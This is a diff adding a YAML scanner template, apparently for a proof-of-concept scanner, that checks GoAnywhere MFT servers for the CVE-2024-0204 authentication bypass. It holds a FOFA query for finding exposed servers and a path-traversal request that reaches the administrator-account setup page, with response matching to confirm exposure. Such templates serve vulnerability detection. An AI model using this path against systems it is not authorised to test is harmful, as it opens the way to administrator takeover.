@@ -1,0 +1,16 @@
+id: poc-yaml-goanywhere-mft-authentication-bypass
+info:
+  name: GoAnywhere MFT 身份验证绕过漏洞(CVE-2024-0204)
+  severity: critical
+  tags:
+  - CVE-2024-0204
+  - 两高一弱
+  finger: goanywhere
+  fofa: title="GoAnywhere" && is_domain=false
+requests:
+- method: GET
+  path: /goanywhere/images/..;/wizard/InitialAccountSetup.xhtml
+  expression: status_code == 200 && contains(body,"Create an administrator account")
+    && contains(body,"GoAnywhere") && contains(body,"Confirm Password")
+variables: {}
+transport: http
